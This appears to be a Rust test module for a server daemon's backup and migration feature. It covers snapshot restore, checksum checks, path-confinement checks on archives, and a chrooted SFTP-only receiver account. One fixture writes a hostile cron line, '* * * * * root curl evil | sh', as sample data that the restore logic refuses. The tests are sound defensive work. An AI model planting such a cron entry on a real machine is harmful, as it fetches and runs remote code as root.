            "var/lib/docker/volumes/serveros-shop_data/_data2/x",
            &roots
        ));
        assert!(!entry_within("etc/cron.d/evil", &roots));
        assert!(!entry_within(
            "var/lib/docker/volumes/serveros-shop_data/_data/../../../x",
            &roots
        ));
        assert!(!entry_within("", &roots));
    }

    fn files_service(name: &str, data: &Path) -> ManagedService {
        ManagedService {
            key: format!("x:{name}"),
            name: name.into(),
            run_by: daemon_services::RunBy::Systemd {
                unit: format!("{name}.service"),
            },
            origin: daemon_protocol::ServiceOrigin::Discovered,
            adopted_at: 0,
            capabilities: vec![],
            roots: vec![data.to_path_buf()],
            config_paths: vec![],
            data_dir: None,
            added_artifacts: vec![],
        }
    }

    fn snapshotter(dir: &Path) -> daemon_backup::Snapshotter {
        daemon_backup::Snapshotter {
            backups_dir: dir.to_path_buf(),
            disk_high_water_percent: 100,
            retention: 7,
        }
    }

    fn progress() -> daemon_jobs::Progress {
        let state = std::sync::Arc::new(daemon_state::State::in_memory().unwrap());
        let id = uuid::Uuid::new_v4();
        state.record_job(id, "test", "restore", "{}").unwrap();
        let (tx, _rx) = tokio::sync::mpsc::channel(64);
        daemon_jobs::Progress::new(id, state, tx, vec![])
    }

    /// What `backup_to` over SFTP leaves in the receiver: the snapshot's
    /// files under prefix/service/snapshot in the receiver's data folder.
    fn deliver(from: &Path, receiver: &Path, received: &str) {
        let to = receiver.join(received);
        std::fs::create_dir_all(&to).unwrap();
        for entry in std::fs::read_dir(from).unwrap() {
            let entry = entry.unwrap();
            std::fs::copy(entry.path(), to.join(entry.file_name())).unwrap();
        }
    }

    fn contents(dir: &Path) -> Vec<(String, Vec<u8>)> {
        let mut found = Vec::new();
        let mut stack = vec![dir.to_path_buf()];
        while let Some(path) = stack.pop() {
            for entry in std::fs::read_dir(&path).unwrap() {
                let path = entry.unwrap().path();
                if path.is_dir() {
                    stack.push(path);
                } else {
                    let name = path
                        .strip_prefix(dir)
                        .unwrap()
                        .to_string_lossy()
                        .into_owned();
                    found.push((name, std::fs::read(&path).unwrap()));
                }
            }
        }
        found.sort();
        found
    }

    /// A whole move of a service's files with the daemon's own code: the
    /// source snapshots it, the snapshot lands in the destination's receiver
    /// as SFTP would leave it, and the destination checks it and restores it
    /// over an empty volume at the same path.
    #[tokio::test]
    async fn a_snapshot_sent_from_another_machine_restores_byte_for_byte() {
        let root = tempfile::tempdir().unwrap();
        let data = root
            .path()
            .join("var/lib/docker/volumes/serveros-shop_data/_data");
        std::fs::create_dir_all(data.join("uploads/2026")).unwrap();
        std::fs::write(data.join("index.html"), "<h1>shop</h1>").unwrap();
        let photo: Vec<u8> = (0..300_000u32)
            .map(|i| (i.wrapping_mul(2_654_435_761) >> 13) as u8)
            .collect();
        std::fs::write(data.join("uploads/2026/photo.jpg"), &photo).unwrap();
        std::fs::write(data.join("uploads/notes.txt"), "keep me").unwrap();
        let before = contents(&data);

        let service = files_service("shop", &data);
        let strategy = Strategy::Files {
            paths: vec![data.clone()],
        };
        let (_tx, mut cancel) = tokio::sync::watch::channel(false);
        let progress = progress();

        // On the source.
        let source = snapshotter(&root.path().join("source-backups"));
        let manifest = source
            .take(&service, &strategy, "move", 1024, &mut cancel, &progress)
            .await
            .unwrap();
        let sent = source.service_dir("shop").join(&manifest.id);

        // Sent over: on the destination, whose fresh volume is empty but for its own file.
        let receiver = root.path().join("receiver");
        let received = format!("moves/7/shop/{}", manifest.id);
        deliver(&sent, &receiver, &received);
        std::fs::remove_dir_all(&data).unwrap();
        std::fs::create_dir_all(&data).unwrap();
        std::fs::write(data.join("default.html"), "a fresh install").unwrap();

        let destination = snapshotter(&root.path().join("destination-backups"));
        let from = received_dir(&receiver, &received, &manifest.id).unwrap();
        let to = destination.service_dir("shop").join(&manifest.id);
        copy_received(&from, &to, strategy.label(), "shop").unwrap();
        archive_within(&to.join("files.tar.gz"), std::slice::from_ref(&data))
            .await
            .unwrap();
        let (safety, restored) = destination
            .restore(
                &service,
                &strategy,
                &manifest.id,
                &daemon_services::systemd::SystemdAdapter::default(),
                &mut cancel,
                &progress,
            )
            .await
            .unwrap();

        assert_eq!(restored.id, manifest.id);
        let after: Vec<_> = contents(&data)
            .into_iter()
            .filter(|(n, _)| n != "default.html")
            .collect();
        assert_eq!(after, before, "every file comes back byte for byte");
        // The destination's own data was snapshotted first, so the restore can be undone.
        assert!(destination.list("shop").iter().any(|m| m.id == safety));
    }

    #[tokio::test]
    async fn a_snapshot_damaged_on_the_way_is_not_restored() {
        let root = tempfile::tempdir().unwrap();
        let data = root.path().join("srv/shop");
        std::fs::create_dir_all(&data).unwrap();
        std::fs::write(data.join("orders.csv"), "1,paid\n2,paid\n").unwrap();
        let service = files_service("shop", &data);
        let strategy = Strategy::Files {
            paths: vec![data.clone()],
        };
        let (_tx, mut cancel) = tokio::sync::watch::channel(false);
        let progress = progress();

        let source = snapshotter(&root.path().join("source-backups"));
        let manifest = source
            .take(&service, &strategy, "move", 1024, &mut cancel, &progress)
            .await
            .unwrap();
        let receiver = root.path().join("receiver");
        let received = format!("moves/7/shop/{}", manifest.id);
        deliver(
            &source.service_dir("shop").join(&manifest.id),
            &receiver,
            &received,
        );

        // One byte changed in transit.
        let archive = receiver.join(&received).join("files.tar.gz");
        let mut bytes = std::fs::read(&archive).unwrap();
        let last = bytes.len() - 1;
        bytes[last] ^= 0xff;
        std::fs::write(&archive, bytes).unwrap();
        std::fs::write(data.join("orders.csv"), "kept as it was").unwrap();

        let destination = snapshotter(&root.path().join("destination-backups"));
        let from = received_dir(&receiver, &received, &manifest.id).unwrap();
        copy_received(
            &from,
            &destination.service_dir("shop").join(&manifest.id),
            "tar",
            "shop",
        )
        .unwrap();
        let refused = destination
            .restore(
                &service,
                &strategy,
                &manifest.id,
                &daemon_services::systemd::SystemdAdapter::default(),
                &mut cancel,
                &progress,
            )
            .await
            .unwrap_err();

        assert!(
            refused.message.contains("does not match its checksum"),
            "{}",
            refused.message
        );
        assert_eq!(
            std::fs::read_to_string(data.join("orders.csv")).unwrap(),
            "kept as it was"
        );
    }

    #[tokio::test]
    async fn a_snapshot_of_other_folders_is_refused_before_anything_is_written() {
        let root = tempfile::tempdir().unwrap();
        let elsewhere = root.path().join("etc/cron.d");
        std::fs::create_dir_all(&elsewhere).unwrap();
        std::fs::write(elsewhere.join("evil"), "* * * * * root curl evil | sh").unwrap();
        let data = root.path().join("srv/shop");
        std::fs::create_dir_all(&data).unwrap();
        let (_tx, mut cancel) = tokio::sync::watch::channel(false);
        let progress = progress();

        // A sender with a receiver key makes a snapshot of somewhere else.
        let sender = snapshotter(&root.path().join("sender-backups"));
        let manifest = sender
            .take(
                &files_service("shop", &elsewhere),
                &Strategy::Files {
                    paths: vec![elsewhere.clone()],
                },
                "move",
                1024,
                &mut cancel,
                &progress,
            )
            .await
            .unwrap();
        let receiver = root.path().join("receiver");
        let received = format!("moves/7/shop/{}", manifest.id);
        deliver(
            &sender.service_dir("shop").join(&manifest.id),
            &receiver,
            &received,
        );
        std::fs::remove_dir_all(&elsewhere).unwrap();

        let destination = snapshotter(&root.path().join("destination-backups"));
        let from = received_dir(&receiver, &received, &manifest.id).unwrap();
        let to = destination.service_dir("shop").join(&manifest.id);
        copy_received(&from, &to, "tar", "shop").unwrap();
        let refused = archive_within(&to.join("files.tar.gz"), std::slice::from_ref(&data))
            .await
            .unwrap_err();

        assert!(refused.message.contains("outside the service's folders"));
        assert!(!elsewhere.exists(), "nothing was extracted");
    }

    #[tokio::test]
    async fn a_files_archive_is_listed_before_it_is_restored() {
        let dir = tempfile::tempdir().unwrap();
        let inside = dir.path().join("data");
        std::fs::create_dir_all(&inside).unwrap();
        std::fs::write(inside.join("a.txt"), "a").unwrap();
        let archive = dir.path().join("files.tar.gz");
        let made = std::process::Command::new("tar")
            .args([
                "-czf",
                &archive.to_string_lossy(),
                &inside.to_string_lossy(),
            ])
            .status()
            .unwrap();
        assert!(made.success());

        assert!(archive_within(&archive, std::slice::from_ref(&inside))
            .await
            .is_ok());
        let elsewhere = dir.path().join("elsewhere");
        let refused = archive_within(&archive, &[elsewhere]).await.unwrap_err();
        assert!(refused.message.contains("outside the service's folders"));
    }

    const KEY_A: &str =
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    const KEY_B: &str =
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIObbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";

    #[test]
    fn every_key_is_sftp_only_in_the_data_folder() {
        let written = authorized_keys(
            "",
            Some(&ReceiverKeys::Add(format!("{KEY_A} serveros-backups"))),
        );
        assert_eq!(
            written,
            format!("restrict,command=\"internal-sftp -d /backups\" {KEY_A} serveros-backups\n")
        );
    }

    #[test]
    fn an_exact_list_drops_every_other_key_and_an_empty_one_drops_them_all() {
        let old =
            format!("restrict,command=\"/usr/lib/openssh/sftp-server\" {KEY_A} serveros-backups\n");
        let written = authorized_keys(&old, Some(&ReceiverKeys::Exactly(vec![KEY_B.into()])));
        assert!(written.contains(KEY_B) && !written.contains(KEY_A));
        assert_eq!(
            authorized_keys(&old, Some(&ReceiverKeys::Exactly(vec![]))),
            ""
        );
    }

    #[test]
    fn adding_keeps_the_keys_there_and_moves_them_into_the_jail() {
        let old = format!(
            "restrict,command=\"/usr/lib/openssh/sftp-server\" {KEY_A} serveros-backups\n# a note\n"
        );
        let written = authorized_keys(&old, Some(&ReceiverKeys::Add(KEY_B.into())));
        assert_eq!(written.lines().count(), 2);
        assert!(written
            .lines()
            .all(|l| l.starts_with("restrict,command=\"internal-sftp -d /backups\" ")));
        assert_eq!(
            authorized_keys(&written, Some(&ReceiverKeys::Add(KEY_B.into()))),
            written
        );
        assert!(!authorized_keys(&old, None).contains("sftp-server"));
    }

    #[test]
    fn the_jail_confines_the_account_to_sftp_in_its_home() {
        let block = sshd_match_block();
        assert!(block.contains("Match User serveros-backups\n"));
        assert!(block.contains("    ChrootDirectory /var/lib/serveros-backups\n"));
        assert!(block.contains("    ForceCommand internal-sftp -d /backups\n"));
        assert!(block.contains("    PermitTTY no\n"));
    }

    #[test]
    fn without_drop_ins_the_block_goes_at_the_end_once() {
        let main = "Port 22\nSubsystem sftp /usr/libexec/openssh/sftp-server\n";
        assert!(!reads_drop_ins(main));
        assert!(reads_drop_ins(
            "Include /etc/ssh/sshd_config.d/*.conf\nPort 22\n"
        ));
        let once = with_managed_block(main);
        assert!(once.starts_with(main));
        assert!(once.trim_end().ends_with(SSHD_END));
        assert_eq!(with_managed_block(&once), once);
    }

    /// On a throwaway Linux machine, as root, with openssh-server installed:
    /// SERVEROS_RECEIVER_E2E_KEY="$(cat key.pub)" cargo test -p serverosd -- --ignored receiver_on_a_real_machine
    /// Changes users, /var/lib/serveros-backups and sshd's config, so never
    /// run it anywhere else.
    #[tokio::test]
    #[ignore]
    async fn receiver_on_a_real_machine() {
        // CI runs ignored tests as root too; this one only runs when asked.
        let Ok(key) = std::env::var("SERVEROS_RECEIVER_E2E_KEY") else {
            return;
        };
        // A receiver as an older daemon left it: the backups in the home,
        // owned by the account, and a key forced to the external sftp-server.
        run(
            "useradd",
            &[
                "--system",
                "--create-home",
                "--home-dir",
                RECEIVER_HOME,
                "--shell",
                "/bin/sh",
                RECEIVER_USER,
            ],
        )
        .await
        .unwrap();
        let home = Path::new(RECEIVER_HOME);
        std::fs::create_dir_all(home.join("acme/web-1")).unwrap();
        std::fs::write(home.join("acme/web-1/old.sql"), "old").unwrap();
        std::fs::create_dir_all(home.join(".ssh")).unwrap();
        std::fs::write(
            home.join(".ssh/authorized_keys"),
            format!("restrict,command=\"/usr/lib/openssh/sftp-server\" {KEY_A} serveros-backups\n"),
        )
        .unwrap();

        harden(None).await.unwrap();
        assert!(home.join("backups/acme/web-1/old.sql").is_file());
        assert!(!home.join("acme").exists());
        receiver(ReceiverKeys::Exactly(vec![key.clone()]))
            .await
            .unwrap();

        let keys = std::fs::read_to_string(home.join(".ssh/authorized_keys")).unwrap();
        assert!(keys.contains(&bare_key(&key)) && !keys.contains(KEY_A));
        use std::os::unix::fs::MetadataExt;
        assert_eq!(std::fs::metadata(home).unwrap().uid(), 0);
        assert_eq!(
            std::fs::metadata(home.join(".ssh/authorized_keys"))
                .unwrap()
                .uid(),
            0
        );
        // Again changes nothing.
        receiver(ReceiverKeys::Exactly(vec![key])).await.unwrap();
    }

    #[test]
    fn older_backups_move_into_the_data_folder_but_keys_and_dotfiles_stay() {
        let names = [".ssh", ".bashrc", "backups", "acme", "web-1"].map(String::from);
        assert_eq!(
            entries_to_move(&names),
            vec!["acme".to_string(), "web-1".to_string()]
        );
    }

    #[test]
    fn objects_go_under_the_prefix_service_and_snapshot() {
        assert_eq!(
            object_base("/workspace/machine/", "serveros-mc", "1700-daily"),
            "workspace/machine/serveros-mc/1700-daily"
        );
        assert_eq!(object_base("", "a b", "1"), "a-b/1");
    }

    #[test]
    fn skips_mount_sources_that_are_gone() {
        let dir = tempfile::tempdir().unwrap();
        let gone = dir.path().join("jobs/old/volumes");
        assert_eq!(
            existing(vec![dir.path().to_path_buf(), gone]),
            vec![dir.path().to_path_buf()]
        );
    }

    #[test]
    fn keeps_volumes_and_skips_sockets_and_system_paths() {
        let inspect = "/var/lib/docker/volumes/mc_data/_data\n/var/run/docker.sock\n/etc\n\n/srv/world\n/srv/world\n";
        assert_eq!(
            mount_paths(inspect),
            vec![
                PathBuf::from("/srv/world"),
                PathBuf::from("/var/lib/docker/volumes/mc_data/_data")
            ]
        );
    }
}
